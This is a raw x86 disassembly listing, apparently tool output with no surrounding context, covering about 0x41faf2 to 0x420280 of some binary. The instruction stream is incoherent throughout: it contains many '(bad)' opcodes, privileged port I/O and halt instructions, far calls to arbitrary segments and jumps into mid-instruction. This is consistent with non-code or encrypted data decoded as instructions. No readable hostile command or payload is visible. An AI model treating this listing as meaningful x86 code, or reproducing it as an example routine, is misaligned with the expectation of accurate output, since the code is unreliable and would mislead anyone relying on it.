  41faf2:	xchg   esi,eax
  41faf3:	iretw  
  41faf5:	jo     0x41fae6
  41faf7:	nop    DWORD PTR [edx]
  41fafa:	hlt    
  41fafb:	sub    BYTE PTR [edx-0x26],0x3
  41faff:	sub    al,0xfe
  41fb01:	sbb    ebx,DWORD PTR [esi]
  41fb03:	jne    0x41fa8d
  41fb05:	aas    
  41fb06:	push   ds
  41fb07:	in     eax,dx
  41fb08:	push   0x1498e978
  41fb0d:	push   esi
  41fb0e:	add    ecx,esi
  41fb10:	add    eax,0xf9e3ac14
  41fb15:	inc    edx
  41fb16:	mov    eax,ds:0xed3bfdb8
  41fb1b:	jge    0x41face
  41fb1d:	out    0x1c,eax
  41fb1f:	sub    ebp,DWORD PTR [edx-0x4d]
  41fb22:	outs   dx,BYTE PTR gs:[esi]
  41fb24:	jl     0x41fb22
  41fb26:	push   edi
  41fb27:	jle    0x41fac7
  41fb29:	jbe    0x41fb48
  41fb2b:	adc    DWORD PTR [ecx-0x10],ebp
  41fb2e:	mov    dh,0x96
  41fb30:	adc    al,0x90
  41fb32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb33:	sbb    DWORD PTR [eax+0x6f1b19d1],0x300df63f
  41fb3d:	test   ebp,0xcea1fa58
  41fb43:	neg    BYTE PTR [eax]
  41fb45:	adc    BYTE PTR [esi-0x60],ah
  41fb48:	(bad)  
  41fb49:	jp     0x41fb02
  41fb4b:	mov    esi,0xbce9e756
  41fb50:	(bad)  
  41fb51:	sti    
  41fb52:	inc    ch
  41fb54:	mov    cl,0xca
  41fb56:	sbb    BYTE PTR [ecx-0x1b],0xc5
  41fb5a:	cmp    al,0x33
  41fb5c:	mov    cs,ebp
  41fb5e:	push   eax
  41fb5f:	ja     0x41fb10
  41fb61:	sbb    eax,0xd82b7f34
  41fb66:	mov    esi,0x60633ee4
  41fb6b:	in     eax,0x41
  41fb6d:	pop    edx
  41fb6e:	sbb    DWORD PTR [ebx],ebx
  41fb70:	cdq    
  41fb71:	push   esp
  41fb72:	cmp    esi,0xffffffd5
  41fb75:	out    0x4a,eax
  41fb77:	push   ecx
  41fb78:	scas   eax,DWORD PTR es:[edi]
  41fb79:	outs   dx,BYTE PTR ds:[esi]
  41fb7a:	and    eax,0xa0bd9f7f
  41fb7f:	push   edi
  41fb80:	pop    ebx
  41fb81:	cmp    ch,BYTE PTR [ecx-0x53]
  41fb84:	into   
  41fb85:	pop    esi
  41fb86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb87:	dec    ebx
  41fb88:	imul   ebp,ebp,0xc6f5627e
  41fb8e:	inc    esp
  41fb8f:	push   eax
  41fb90:	pop    esp
  41fb91:	or     al,0xb1
  41fb93:	mov    ecx,DWORD PTR [ebx-0x13]
  41fb96:	mov    edi,0x7e84bc15
  41fb9b:	and    ch,BYTE PTR [edx+edi*1+0x49]
  41fb9f:	out    dx,eax
  41fba0:	in     eax,0xa6
  41fba2:	jns    0x41fb88
  41fba4:	inc    eax
  41fba5:	es add eax,0x4747fd5c
  41fbab:	jns    0x41fbbf
  41fbad:	add    ebx,DWORD PTR [edi-0x40]
  41fbb0:	and    eax,0x7b7be1d3
  41fbb5:	sbb    eax,DWORD PTR [ebp+0x25aa938b]
  41fbbb:	add    BYTE PTR [edx],ch
  41fbbd:	repnz rcl DWORD PTR [di],cl
  41fbc1:	and    ebp,DWORD PTR [ecx]
  41fbc3:	callw  0xb7a1
  41fbc7:	cmc    
  41fbc8:	sbb    eax,DWORD PTR [edx-0x1f]
  41fbcb:	jbe    0x41fbe1
  41fbcd:	push   esi
  41fbce:	clc    
  41fbcf:	inc    edx
  41fbd0:	popf   
  41fbd1:	leave  
  41fbd2:	jecxz  0x41fc11
  41fbd4:	cmp    eax,0xbb0091ce
  41fbd9:	scas   al,BYTE PTR es:[edi]
  41fbda:	or     al,0xe9
  41fbdc:	cdq    
  41fbdd:	inc    esi
  41fbde:	(bad)  
  41fbdf:	retf   0x736
  41fbe2:	mov    eax,0xdc568338
  41fbe7:	add    eax,0x332f6596
  41fbec:	jns    0x41fbf8
  41fbee:	xchg   ebx,eax
  41fbef:	sbb    eax,0xdac7fcee
  41fbf4:	pop    eax
  41fbf5:	cmp    DWORD PTR [esi],ecx
  41fbf7:	test   eax,0x3fe7d10e
  41fbfc:	add    eax,edx
  41fbfe:	add    eax,0xa3dd441a
  41fc03:	sub    DWORD PTR [ebp-0x7f7347d],esi
  41fc09:	mov    DWORD PTR [esi+0x59],ebp
  41fc0c:	imul   esi,DWORD PTR [edi+0x5d84977d],0x6ef488f7
  41fc16:	mov    bh,0x4d
  41fc18:	adc    BYTE PTR [edi+eiz*2-0x55c36238],0x85
  41fc20:	pop    edx
  41fc21:	icebp  
  41fc22:	js     0x41fc70
  41fc24:	add    eax,esi
  41fc26:	mov    esi,0x7947ab96
  41fc2b:	xchg   ebp,eax
  41fc2c:	mov    ch,0x3
  41fc2e:	pop    edi
  41fc2f:	add    BYTE PTR [edi-0x618f4110],dl
  41fc35:	test   al,0x61
  41fc37:	ret    
  41fc38:	cwde   
  41fc39:	or     edx,DWORD PTR [ebx+eax*2+0x62971f3b]
  41fc40:	rcl    BYTE PTR fs:[ebx-0x3b33bd6],1
  41fc47:	mov    dh,0x47
  41fc49:	fimul  WORD PTR [eax+0x21f88dd6]
  41fc4f:	add    eax,0xabdee5c2
  41fc54:	push   ds
  41fc55:	dec    esi
  41fc56:	fstp   QWORD PTR [ebx]
  41fc58:	xchg   esi,eax
  41fc59:	jl     0x41fc5c
  41fc5b:	retf   
  41fc5c:	or     eax,0x6c97e2c3
  41fc61:	andps  xmm4,xmm3
  41fc64:	jle    0x41fc5d
  41fc66:	aam    0xf4
  41fc68:	add    al,0xc2
  41fc6a:	lock and al,0x9
  41fc6d:	(bad)  [eax]
  41fc6f:	mov    ss,WORD PTR [ecx]
  41fc71:	sbb    DWORD PTR [edx+ebp*1-0x1f],0xffffffef
  41fc76:	and    eax,ecx
  41fc78:	fidivr DWORD PTR [edx+ecx*4-0x32]
  41fc7c:	cmp    DWORD PTR [ecx+0x2a0afaf6],0x6d722aa0
  41fc86:	fld    QWORD PTR [esi]
  41fc88:	int    0x42
  41fc8a:	xchg   BYTE PTR [eax-0x79],bl
  41fc8d:	add    BYTE PTR [esi+eax*1],dl
  41fc90:	int    0x69
  41fc92:	int    0x6c
  41fc94:	adc    BYTE PTR [eax+0x70],0xb
  41fc98:	mov    ecx,0x9e97ea94
  41fc9d:	mov    ah,0x59
  41fc9f:	push   esp
  41fca0:	and    al,0xc1
  41fca2:	retf   0xc62
  41fca5:	cwde   
  41fca6:	jae    0x21360cc7
  41fcac:	test   DWORD PTR [ebp+0x13],esp
  41fcaf:	cdq    
  41fcb0:	call   0xf600:0x14c7ca2c
  41fcb7:	cmp    BYTE PTR [edx-0xfb8ba84],dl
  41fcbd:	push   edi
  41fcbe:	xchg   edx,eax
  41fcbf:	shl    BYTE PTR [edi-0x23],0x4b
  41fcc3:	rol    DWORD PTR [ecx+eiz*1],0x15
  41fcc7:	es ins DWORD PTR es:[edi],dx
  41fcc9:	push   0x8b1a61f6
  41fcce:	cmc    
  41fccf:	js     0x41fcbf
  41fcd1:	push   ecx
  41fcd2:	test   al,0xc7
  41fcd4:	add    al,0x41
  41fcd6:	ja     0x41fccd
  41fcd8:	mov    WORD PTR [edi],ss
  41fcda:	jl     0x41fc89
  41fcdc:	push   es
  41fcdd:	leave  
  41fcde:	out    0xe3,eax
  41fce0:	pop    eax
  41fce1:	cmp    DWORD PTR [ecx],edi
  41fce3:	cmp    dl,ch
  41fce5:	cdq    
  41fce6:	ret    0xcb52
  41fce9:	cmp    ecx,ebx
  41fceb:	out    dx,eax
  41fcec:	lock neg ebp
  41fcef:	add    eax,0x7d54a51e
  41fcf4:	test   BYTE PTR [edx-0x2],ah
  41fcf7:	test   DWORD PTR [ecx+0x75],eax
  41fcfa:	push   esp
  41fcfb:	cli    
  41fcfc:	aas    
  41fcfd:	sub    al,0xc6
  41fcff:	mov    al,ds:0xf0ff68ef
  41fd04:	ret    0xe4bf
  41fd07:	push   ss
  41fd08:	dec    ecx
  41fd09:	xchg   ecx,eax
  41fd0a:	out    0xf5,eax
  41fd0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd0d:	inc    esp
  41fd0e:	scas   al,BYTE PTR es:[edi]
  41fd0f:	fld    QWORD PTR [ebx+0x7e]
  41fd12:	mov    dh,0x29
  41fd14:	inc    eax
  41fd15:	loop   0x41fd19
  41fd17:	add    BYTE PTR [edx-0x71],al
  41fd1a:	push   edx
  41fd1b:	inc    edi
  41fd1c:	and    DWORD PTR [ebp-0x4bf2dade],edi
  41fd22:	cdq    
  41fd23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd24:	test   eax,0xb673fc5c
  41fd29:	jmp    DWORD PTR [esi]
  41fd2b:	ja     0x41fda8
  41fd2d:	sub    ch,BYTE PTR [edx+0x1e]
  41fd30:	fst    QWORD PTR [eax-0x7690fe2a]
  41fd36:	aad    0x8f
  41fd38:	pop    ebx
  41fd39:	ja     0x41fd83
  41fd3b:	mov    dl,0x1a
  41fd3d:	push   esp
  41fd3e:	into   
  41fd3f:	cmc    
  41fd40:	pushf  
  41fd41:	or     bh,bh
  41fd43:	jecxz  0x41fd2e
  41fd45:	out    0xf2,al
  41fd47:	call   0x116c:0x52b01b1b
  41fd4e:	ins    DWORD PTR es:[edi],dx
  41fd4f:	push   es
  41fd50:	mov    ebx,0xe851624d
  41fd55:	out    dx,eax
  41fd56:	dec    edi
  41fd58:	arpl   cx,bp
  41fd5a:	add    eax,0x60cba6e9
  41fd5f:	xchg   ebp,eax
  41fd60:	pushf  
  41fd61:	sahf   
  41fd62:	push   es
  41fd63:	shl    DWORD PTR [edx],0x9f
  41fd66:	mov    ds:0xa70ad098,al
  41fd6b:	(bad)  
  41fd6c:	lods   eax,DWORD PTR ds:[esi]
  41fd6d:	fimul  WORD PTR [ebp+0x53]
  41fd70:	xor    al,0xee
  41fd72:	inc    ebp
  41fd73:	out    dx,al
  41fd74:	lahf   
  41fd75:	xor    al,0xc2
  41fd77:	call   0x289d9169
  41fd7c:	mov    ds:0x86e52a53,eax
  41fd81:	sahf   
  41fd82:	fldenv [ecx+0x7d]
  41fd85:	retf   
  41fd86:	cmp    ebp,DWORD PTR [eax-0x485d903f]
  41fd8c:	jmp    0x41fdee
  41fd8e:	aam    0xf1
  41fd90:	dec    ebx
  41fd91:	mov    BYTE PTR [edi+edx*8-0x204068c9],dh
  41fd98:	xor    ch,BYTE PTR [eax]
  41fd9a:	push   ebp
  41fd9b:	jle    0x41fd27
  41fd9d:	xlat   BYTE PTR ds:[ebx]
  41fd9e:	xor    DWORD PTR [ebp-0x5239ee0d],esi
  41fda4:	fisttp QWORD PTR [esi+edx*8+0x10ef5d95]
  41fdab:	jp     0x41fd71
  41fdad:	sbb    BYTE PTR [ecx],cl
  41fdaf:	lds    ecx,FWORD PTR [edi+0x4e]
  41fdb2:	sbb    DWORD PTR [ebx+ebx*4+0x2b],ecx
  41fdb6:	rol    DWORD PTR [eax-0x2e3b0557],cl
  41fdbc:	push   ds
  41fdbd:	imul   esi,DWORD PTR [ecx-0x10399cd],0x25
  41fdc4:	adc    BYTE PTR [ecx-0x67f28c8d],bl
  41fdca:	mov    dh,0xe8
  41fdcc:	mov    ds:0x52b982df,eax
  41fdd1:	sbb    al,0x54
  41fdd3:	mov    ds:0x40d484b3,al
  41fdd8:	add    al,BYTE PTR [ecx-0x66d83549]
  41fdde:	mov    ds:0x712670da,eax
  41fde3:	mov    al,ds:0x1a44780e
  41fde8:	mov    esp,0x7d1b7ec4
  41fded:	pushf  
  41fdee:	xchg   edi,eax
  41fdef:	mov    WORD PTR ds:0x5af118b7,ss
  41fdf5:	mov    al,0x6e
  41fdf7:	fmul   QWORD PTR [eax-0x313d2453]
  41fdfd:	adc    al,BYTE PTR [edi]
  41fdff:	cmp    al,BYTE PTR [ecx-0x21c5ec84]
  41fe05:	mov    dh,dh
  41fe07:	jbe    0x41fd99
  41fe09:	sub    ah,BYTE PTR [ebx]
  41fe0b:	das    
  41fe0c:	enter  0x87bb,0x8d
  41fe10:	mov    dh,0xce
  41fe12:	mov    dh,0xd4
  41fe14:	add    edx,DWORD PTR [esi+0x23ca283e]
  41fe1a:	jge    0x41fe04
  41fe1c:	jno    0x41fe42
  41fe1e:	jp     0x41fe4b
  41fe20:	mov    dh,al
  41fe22:	mov    al,0x5f
  41fe24:	jp     0x41fe4b
  41fe26:	cmc    
  41fe27:	imul   esi,DWORD PTR [edi],0x6e
  41fe2a:	mov    ds:0x7f4e10b2,eax
  41fe2f:	into   
  41fe30:	das    
  41fe31:	mov    cl,0x42
  41fe33:	out    0x96,eax
  41fe35:	xchg   edx,eax
  41fe36:	lods   eax,DWORD PTR ds:[esi]
  41fe37:	sar    DWORD PTR [ecx],0xd5
  41fe3a:	dec    edi
  41fe3b:	dec    edx
  41fe3c:	mov    dh,0x6f
  41fe3e:	sbb    esp,DWORD PTR [esi]
  41fe40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe41:	mov    ds:0xcd5627ac,eax
  41fe46:	dec    esi
  41fe47:	push   ecx
  41fe48:	test   DWORD PTR [ebx-0x63],ebp
  41fe4b:	push   ss
  41fe4c:	push   esi
  41fe4d:	lea    ebx,[edi]
  41fe4f:	inc    ebx
  41fe50:	adc    DWORD PTR [ebp+0x29],esi
  41fe53:	call   0x58a54216
  41fe58:	mov    eax,0xe5c912a4
  41fe5d:	add    BYTE PTR [edi+0x3ce19567],al
  41fe63:	out    0xf,eax
  41fe65:	mov    cl,0x1c
  41fe67:	push   es
  41fe68:	mov    esp,0x91349e72
  41fe6d:	out    0x96,eax
  41fe6f:	jb     0x41fe6e
  41fe71:	mov    bl,0x4f
  41fe73:	dec    edi
  41fe74:	xor    edi,edx
  41fe76:	fcomp  st(4)
  41fe78:	add    ecx,edx
  41fe7a:	dec    ebp
  41fe7b:	stos   DWORD PTR es:[edi],eax
  41fe7c:	outs   dx,DWORD PTR ds:[esi]
  41fe7d:	push   esi
  41fe7e:	cmp    ebx,0x17
  41fe81:	push   ss
  41fe82:	add    dl,dl
  41fe84:	out    0xa0,eax
  41fe86:	mul    DWORD PTR [ecx+0xe]
  41fe89:	cmp    al,0x24
  41fe8b:	dec    eax
  41fe8c:	mov    esi,0x7f989902
  41fe91:	pop    ebx
  41fe92:	inc    edx
  41fe93:	xor    ebx,DWORD PTR [eax+0x41]
  41fe96:	xor    BYTE PTR [eax],dl
  41fe98:	dec    eax
  41fe99:	idiv   ecx
  41fe9b:	add    BYTE PTR [esi-0x1f379187],ch
  41fea1:	mov    dh,BYTE PTR [edx]
  41fea3:	pushf  
  41fea4:	fdivr  QWORD PTR [edi+ebp*4-0x26]
  41fea8:	scas   eax,DWORD PTR es:[edi]
  41fea9:	imul   eax,esi,0xffffffad
  41feac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fead:	iret   
  41feae:	aam    0x74
  41feb0:	sbb    eax,DWORD PTR [ecx+0x4f]
  41feb3:	mov    BYTE PTR [edi+0x6e39e9c1],bh
  41feb9:	xor    eax,0x95f1020d
  41febe:	mov    ecx,0xea36e5fe
  41fec3:	loope  0x41ff0a
  41fec5:	mov    ds:0xc0c3495d,eax
  41feca:	push   ecx
  41fecb:	or     eax,0x10e2013a
  41fed0:	push   ebp
  41fed1:	daa    
  41fed2:	js     0x41fec9
  41fed4:	mov    cl,0x56
  41fed6:	ror    BYTE PTR [ecx],0x18
  41fed9:	enter  0x6075,0xf7
  41fedd:	call   0x2bfc777b
  41fee2:	scas   al,BYTE PTR es:[edi]
  41fee3:	push   cs
  41fee4:	jbe    0x41feae
  41fee6:	scas   al,BYTE PTR es:[edi]
  41fee7:	pop    ebp
  41fee8:	idiv   BYTE PTR [edi+ebx*2]
  41feeb:	mov    bl,0x36
  41feed:	call   0xc5e3:0x5f3f613d
  41fef4:	inc    eax
  41fef5:	in     al,0x59
  41fef7:	mov    edx,0xec6b929a
  41fefc:	test   al,0x51
  41fefe:	mov    WORD PTR [esi+0x6684ad7b],fs
  41ff04:	cmp    DWORD PTR [eax+esi*2+0x78ffbcf7],eax
  41ff0b:	jo     0x41ff28
  41ff0d:	mov    ebx,edi
  41ff0f:	int    0x9f
  41ff11:	xchg   edx,eax
  41ff12:	xor    BYTE PTR [edx+0x10382a47],cl
  41ff18:	adc    eax,0x5556dedb
  41ff1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff1e:	jmp    0x38d5c83a
  41ff23:	mov    edi,0x772a1c08
  41ff28:	int3   
  41ff29:	fs pop ds
  41ff2b:	sbb    edx,esp
  41ff2d:	popa   
  41ff2e:	sahf   
  41ff2f:	fsub   st(4),st
  41ff31:	(bad)  
  41ff32:	or     dh,BYTE PTR [ecx-0x38]
  41ff35:	cwde   
  41ff36:	shl    bh,0x17
  41ff39:	out    0xf,eax
  41ff3b:	push   ds
  41ff3c:	or     cl,dl
  41ff3e:	adc    al,0xb6
  41ff40:	dec    ecx
  41ff41:	push   edx
  41ff42:	and    DWORD PTR [ecx],esi
  41ff44:	lahf   
  41ff45:	xor    dl,BYTE PTR [esi-0x60]
  41ff48:	mov    cl,0x1
  41ff4a:	imul   ebp,edi,0x13150ba7
  41ff50:	bts    DWORD PTR [esi],ebp
  41ff53:	call   DWORD PTR [edx]
  41ff55:	dec    ebx
  41ff56:	lods   al,BYTE PTR ds:[esi]
  41ff57:	pop    es
  41ff58:	push   eax
  41ff59:	add    ebp,DWORD PTR [esi]
  41ff5b:	out    dx,eax
  41ff5c:	push   edx
  41ff5d:	xchg   esp,eax
  41ff5e:	jge    0x41ff74
  41ff60:	into   
  41ff61:	or     ebp,ebx
  41ff63:	rcr    DWORD PTR [ebx+0x9],1
  41ff66:	adc    al,0xd3
  41ff68:	rol    DWORD PTR [esi+0x132ba72],cl
  41ff6e:	xor    ch,BYTE PTR [eax]
  41ff70:	cdq    
  41ff71:	mov    dl,0x7a
  41ff73:	fld    QWORD PTR [edi]
  41ff75:	add    eax,0x4cd5f961
  41ff7a:	pop    ebx
  41ff7b:	dec    eax
  41ff7c:	test   al,0x20
  41ff7e:	psllq  mm1,QWORD PTR [eax+0x74]
  41ff82:	sbb    dl,BYTE PTR [ebx+0x15e52d7b]
  41ff88:	sub    al,0x7d
  41ff8a:	gs inc ebp
  41ff8c:	ret    0x2050
  41ff8f:	mov    ebp,0xc8840daf
  41ff94:	ss loopne 0x41ff78
  41ff97:	retf   
  41ff98:	ja     0x41ffc0
  41ff9a:	in     eax,0xc9
  41ff9c:	and    DWORD PTR [eax],eax
  41ff9e:	(bad)  
  41ff9f:	pop    ss
  41ffa0:	or     DWORD PTR ds:0x4ace2d72,ebp
  41ffa6:	repz xor al,0xe8
  41ffa9:	jmp    0x41ffb7
  41ffab:	or     eax,0xc09477e9
  41ffb0:	jmp    0x41ff4b
  41ffb2:	test   al,0x6
  41ffb4:	sti    
  41ffb5:	clc    
  41ffb6:	adc    esi,DWORD PTR ds:0x5fe24305
  41ffbc:	mov    BYTE PTR [ebx],dh
  41ffbe:	xor    DWORD PTR [ebp+0x1250b9dc],ecx
  41ffc4:	pushf  
  41ffc5:	push   esi
  41ffc6:	adc    bh,dh
  41ffc8:	lds    edi,FWORD PTR [ebx-0x43d9c2fc]
  41ffce:	(bad)  
  41ffcf:	xchg   edx,eax
  41ffd0:	pop    ecx
  41ffd1:	jmp    0x31be:0x91c8e91c
  41ffd8:	pop    eax
  41ffd9:	cdq    
  41ffda:	xor    ch,BYTE PTR [ebp+eiz*4+0x401bad99]
  41ffe1:	fs (bad) 
  41ffe4:	ret    
  41ffe5:	repz sbb esi,DWORD PTR [ebx]
  41ffe8:	push   es
  41ffe9:	repnz adc eax,0x952b76c
  41ffef:	push   ebp
  41fff0:	xlat   BYTE PTR ds:[ebx]
  41fff1:	add    esi,DWORD PTR [si-0xf]
  41fff5:	sub    al,0x41
  41fff7:	jle    0x420062
  41fff9:	xchg   edi,eax
  41fffa:	and    eax,0xea6cb6e1
  41ffff:	pop    esi
  420000:	neg    BYTE PTR [eax+0x27]
  420003:	shl    ebp,cl
  420005:	cmp    dh,bl
  420007:	mov    ebp,0x55587cc8
  42000c:	cmc    
  42000d:	ins    BYTE PTR es:[edi],dx
  42000e:	stos   DWORD PTR es:[edi],eax
  42000f:	std    
  420010:	ds dec dl
  420013:	call   0xbc943789
  420018:	jl     0x420086
  42001a:	cli    
  42001b:	dec    ebx
  42001c:	aad    0x83
  42001e:	sahf   
  42001f:	stos   BYTE PTR es:[edi],al
  420020:	hlt    
  420021:	loope  0x420044
  420023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420024:	pop    es
  420025:	test   ah,dl
  420027:	mov    bh,0xcc
  420029:	mov    WORD PTR [eax-0x2a],?
  42002c:	jb     0x420020
  42002e:	push   ebp
  42002f:	pop    ebp
  420030:	test   esp,0x5009a81e
  420036:	xchg   BYTE PTR [ebx+0x7b],dh
  420039:	iret   
  42003a:	fmul   st,st(3)
  42003c:	or     dh,cl
  42003e:	mov    eax,ds:0xc556c426
  420043:	in     eax,dx
  420044:	dec    esi
  420045:	mov    ecx,edi
  420047:	add    al,0x68
  420049:	hlt    
  42004a:	sub    al,0x32
  42004c:	mov    bl,0x59
  42004e:	push   edi
  42004f:	fnstsw WORD PTR [edx]
  420051:	mov    ebx,0xf01cd606
  420056:	cmc    
  420057:	test   BYTE PTR [ecx+0x12f37c18],dl
  42005d:	iret   
  42005e:	out    dx,al
  42005f:	adc    DWORD PTR [edi-0x6f26e9e4],0xffffffee
  420066:	jp     0x420073
  420068:	adc    esp,ecx
  42006a:	inc    ebx
  42006b:	add    esi,ebp
  42006d:	data16 sub al,0x9d
  420070:	or     eax,0xfbb246ef
  420075:	imul   esi,DWORD PTR [esi+esi*4-0x61ea1d39],0x70
  42007d:	inc    esp
  42007e:	aam    0x97
  420080:	pusha  
  420081:	enter  0xbd67,0xfb
  420085:	jo     0x4200cf
  420087:	adc    eax,0x59929b82
  42008c:	add    eax,0xdc5d51ec
  420091:	jmp    0x77d2:0x25975871
  420098:	outs   dx,DWORD PTR ds:[esi]
  420099:	xchg   ebp,eax
  42009a:	inc    ebp
  42009b:	sbb    dl,BYTE PTR [ebp-0x5018e2a1]
  4200a1:	mov    ds:0x7dfe5930,eax
  4200a6:	(bad)  
  4200a7:	jmp    0x4200a7
  4200a9:	inc    ebx
  4200aa:	bound  edi,QWORD PTR [ebx+0x3e6e957]
  4200b0:	test   al,0x7e
  4200b2:	xchg   BYTE PTR [ecx+0x7cedfea3],bh
  4200b8:	not    BYTE PTR [edi+0x9ae6be3]
  4200be:	adc    ah,BYTE PTR ds:[ebx-0x594613a7]
  4200c5:	xchg   ebx,eax
  4200c6:	xchg   DWORD PTR [ecx-0x6a],eax
  4200c9:	push   0x4fddf324
  4200ce:	stos   DWORD PTR es:[edi],eax
  4200cf:	outs   dx,BYTE PTR ds:[esi]
  4200d0:	mov    esi,0x1b6d550
  4200d5:	repnz inc BYTE PTR [edx+edx*4]
  4200d9:	pop    es
  4200da:	int3   
  4200db:	div    DWORD PTR [edi+0x2a]
  4200de:	or     al,0x80
  4200e0:	fucomip st,st(5)
  4200e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e3:	mov    BYTE PTR [edx+0x36],ch
  4200e6:	test   DWORD PTR ds:0x59627db7,ebp
  4200ec:	pop    ds
  4200ed:	xchg   edx,eax
  4200ee:	jle    0x42015b
  4200f0:	sbb    BYTE PTR [ebx],0x0
  4200f3:	les    edi,FWORD PTR [eax]
  4200f5:	mov    dl,0xd2
  4200f7:	test   ecx,0x384562b0
  4200fd:	les    ebx,FWORD PTR ds:0xe4d4bcb6
  420103:	sbb    BYTE PTR [eax+0x65],0x3e
  420107:	in     eax,dx
  420108:	dec    esp
  420109:	cmp    al,0x2e
  42010b:	inc    edi
  42010c:	rcr    BYTE PTR [edi],1
  42010e:	int    0xb3
  420110:	ret    0xc23
  420113:	aad    0x1b
  420115:	pop    ds
  420116:	bound  ebx,QWORD PTR [eax-0x3ee95931]
  42011c:	adc    bh,cl
  42011e:	add    cl,BYTE PTR [edx]
  420120:	push   es
  420121:	add    edx,DWORD PTR ds:0xb87b442e
  420127:	and    eax,0x880c349b
  42012c:	test   ah,ch
  42012e:	out    dx,eax
  42012f:	sbb    al,BYTE PTR [ebx+0x96137f7]
  420135:	xchg   ebp,eax
  420136:	inc    eax
  420137:	ror    BYTE PTR [ecx-0x3750a138],1
  42013d:	fs sahf 
  42013f:	mov    edx,DWORD PTR [edx-0x2656a08d]
  420145:	ins    BYTE PTR es:[edi],dx
  420146:	je     0x42011b
  420148:	inc    esp
  420149:	xor    ebp,esp
  42014b:	ficomp WORD PTR [ebx-0x343c7bf9]
  420151:	adc    bl,BYTE PTR [edi-0x76]
  420154:	sub    al,0x5f
  420156:	mov    dl,ch
  420158:	mov    WORD PTR [esi+0x0],ds
  42015b:	pop    es
  42015c:	or     esp,DWORD PTR [edi]
  42015e:	fld    QWORD PTR [eax-0x62]
  420161:	(bad)  
  420162:	xchg   ebp,eax
  420163:	xchg   esp,eax
  420164:	mov    al,0x1d
  420166:	xor    al,0xf9
  420168:	cs dec edi
  42016a:	mov    ds:0x3987cea3,al
  42016f:	std    
  420170:	xchg   ebp,eax
  420171:	push   ebp
  420172:	pop    es
  420173:	adc    eax,0x5d9676f
  420178:	lods   eax,DWORD PTR ds:[esi]
  420179:	sub    eax,DWORD PTR [ebp-0x31]
  42017c:	xchg   edi,eax
  42017d:	dec    esi
  42017e:	cmp    eax,DWORD PTR [ebx+0x1d534600]
  420184:	repnz out 0x89,eax
  420187:	fst    QWORD PTR [edi+0x13f290b4]
  42018d:	xchg   DWORD PTR [edx-0x6a918ad5],ecx
  420193:	mov    bh,0xfc
  420195:	xchg   edx,eax
  420196:	jg     0x420182
  420198:	ja     0x4201e6
  42019a:	(bad)  
  42019b:	call   FWORD PTR [ecx]
  42019d:	aaa    
  42019e:	cmp    al,0xe6
  4201a0:	dec    eax
  4201a1:	addr16 (bad) 
  4201a3:	push   esi
  4201a4:	shr    DWORD PTR [ecx+0xd],1
  4201a7:	cli    
  4201a8:	mov    al,0xa0
  4201aa:	push   esi
  4201ab:	test   BYTE PTR [ebp+0x7d],dh
  4201ae:	and    DWORD PTR [esi],eax
  4201b0:	mov    ebp,0x8058c69a
  4201b5:	cmp    esi,0xffffffc1
  4201b8:	jmp    0x645a3089
  4201bd:	pop    DWORD PTR [edx-0x31]
  4201c0:	test   al,0x92
  4201c2:	mov    al,0x7
  4201c4:	sti    
  4201c5:	stos   BYTE PTR es:[edi],al
  4201c6:	mov    eax,ds:0x9201d19d
  4201cb:	std    
  4201cc:	cwde   
  4201cd:	nop
  4201ce:	retf   
  4201cf:	jmp    0x5c78d0b8
  4201d4:	sar    esp,cl
  4201d6:	xchg   edi,eax
  4201d7:	pop    ebx
  4201d8:	stos   BYTE PTR es:[edi],al
  4201d9:	mov    DWORD PTR [esi+ecx*2+0x29],esi
  4201dd:	pop    eax
  4201de:	mov    DWORD PTR [ecx+0x169cc1ce],eax
  4201e4:	adc    eax,0xfd7d2b52
  4201e9:	xchg   ebx,eax
  4201ea:	push   ss
  4201eb:	loop   0x4201e3
  4201ed:	cmp    DWORD PTR [esi+0x2e701b7f],ecx
  4201f3:	dec    ecx
  4201f4:	outs   dx,DWORD PTR ds:[esi]
  4201f5:	adc    BYTE PTR [esi+0x55],dl
  4201f8:	pushf  
  4201f9:	add    ah,BYTE PTR [eax+0x60]
  4201fc:	mov    ?,WORD PTR [esi]
  4201fe:	sbb    al,0xf6
  420200:	xchg   esi,eax
  420201:	pusha  
  420202:	loope  0x4201b8
  420204:	pop    eax
  420205:	loopne 0x420284
  420207:	fdivr  DWORD PTR [ecx+0x216f5070]
  42020d:	fnstcw WORD PTR [eax+0x5]
  420210:	xchg   ebx,eax
  420211:	pop    ss
  420212:	push   ebp
  420213:	daa    
  420214:	leave  
  420215:	push   ebx
  420216:	fistp  DWORD PTR [ebp+0xc]
  420219:	xor    dh,BYTE PTR [edi+edi*4]
  42021c:	xchg   esp,eax
  42021d:	mov    ecx,0xe3229505
  420222:	add    dl,dl
  420224:	sub    BYTE PTR [edx],al
  420226:	dec    edx
  420227:	enter  0xd47f,0x21
  42022b:	shl    DWORD PTR [ebx],0x5b
  42022e:	xor    bl,BYTE PTR [edi+0x38]
  420231:	in     al,0xaa
  420233:	mov    ds:0xb6dd5144,eax
  420238:	aaa    
  420239:	pop    ebx
  42023a:	loopne 0x42026a
  42023c:	(bad)  
  42023d:	fisubr WORD PTR [edi+0x262b272]
  420243:	jnp    0x420231
  420245:	not    BYTE PTR [esi+ebp*1]
  420248:	cwde   
  420249:	dec    edi
  42024a:	jl     0x4201d2
  42024c:	nop
  42024d:	mov    dh,0xd
  42024f:	pushf  
  420250:	add    eax,0xa96c8edf
  420255:	in     eax,dx
  420256:	fsub   DWORD PTR [edx+ebp*2+0xf689408]
  42025d:	cs xor al,0x7
  420260:	call   0xee343d95
  420265:	(bad)  
  420266:	loopne 0x42026b
  420268:	scas   al,BYTE PTR es:[edi]
  420269:	lods   eax,DWORD PTR ds:[esi]
  42026a:	mov    ecx,eax
  42026c:	adc    eax,0xaf6f543e
  420271:	cdq    
  420272:	outs   dx,BYTE PTR ds:[esi]
  420273:	fbstp  TBYTE PTR [esi+0x12338d86]
  420279:	retf   
  42027a:	mov    ah,BYTE PTR [eax+0x2566b2e9]
  420280:	call   0x823e:0xc501011b
